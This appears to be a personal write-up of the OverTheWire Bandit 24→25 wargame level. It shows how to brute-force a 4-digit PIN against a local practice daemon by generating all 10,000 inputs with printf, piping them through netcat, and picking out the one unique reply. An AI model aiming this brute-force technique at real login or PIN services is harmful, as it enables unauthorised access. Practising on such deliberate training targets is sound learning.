# Bandit24 -> 25: The Daemon's Lockbox

[Challenge](https://overthewire.org/wargames/bandit/bandit25.html)

---

## Level Description

In this level, you're told that the daemon is listening on port `30002`. It will give you the password for `bandit25` **only if** you send it:
1. The current password for `bandit24`, and
2. A secret 4-digit **PIN CODE**
3. Both should be sent on a single line, separated by a space.

The twist? 
You don't know the exact PIN-- and there's **no way to retrieve it** other than trying all possible combinations: **brute force** the pin (0000..9999).

The good news:
**You don't need create a new connection each time.**

---

## The Process

**Step 1: Logging into bandit24**

As usual, I connected to the Bandit server using SSH:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Once inside, there wasn't much to explore in home directory. 

**Step 2: Test the connection manually"

use `nc` netcat to talk to the daemon on port `30002`.

```bash
nc localhost 30002
```

You'll see this:

```bash
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Try it with correct password and a random pincode to see how it responds:

```bash
[REDACTED] 8777
```

You'll get a response like:

```bash
Wrong! Please enter the correct current password and pincode. Try again.
```

Perfect--now let's automate it!

**Step 3: Make a temporary working directory"

```bash
mktemp -d 
```

it return:

```bash
/tmp/tmp.wuaaUvfCrE
```

move into that directory:

```bash
cd /tmp/tmp.wuaaUvfCrE
```

- You **don't have write access** to your home directory on bandit.
- `mktemp -d` creates a random-named directory inside `/tmp`, which is both **writable** and **isolated**.
- This prevents other users from guessing your file names or snooping. 

**Step 4: Generate all possible input combinations"

I'll generate 10,000 lines formatted like:

```bash
<password> 0000
<password> 0001
<password> 0002
...
<password> 9999
```

Use this command to generate and save them into a file:

```bash
printf "[REDACTED] %04d\n" {0..9999} >> all_payloads.txt
```

Explanation:

- `%04d/n` pads numbers with leading zeros: `0000`, `0001`, ..., `9999`
- `{0..9999}` loops through all 10,000 numbers
-  `>> all_payloads.txt` writes them all to file for later use.

File succesfully created:
```bash
less all_payloads.txt
```

You confirmed the file contents were as expected.

**Step 5: Send all payloads to the daemon using netcat**

```bash
cat all_payloads.txt | nc localhost 30002 >> results.txt
```

Explanation:

- `cat all_payloads.txt`: reads all the payload lines
- `nc localhost 30002`: pipes each line into the daemon
- `>> results.txt`: appends the daemon's response to a file

Results file created:

```bash
-rw-rw-r-- 1 bandit24 bandit24   678908 Apr  5 01:05 results.txt
```

**Step 6: Find the unique output (correct response)

```bash
sort results.txt | uniq -u
```

Explanation:
- Most lines in `results.txt` will be the same:
`"Wrong! Please enter the correct current password and pincode. Try again."`
- `sort` puts identical lines next to each other.
- `uniq -u` filters and shows **only lines that appear once** -- that's the successful one!

Output:
```bash
Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is [REDACTED]
```

Voila! A golden ticket!

## Password for the Next Level

`[REDACTED]`

## What I Learned




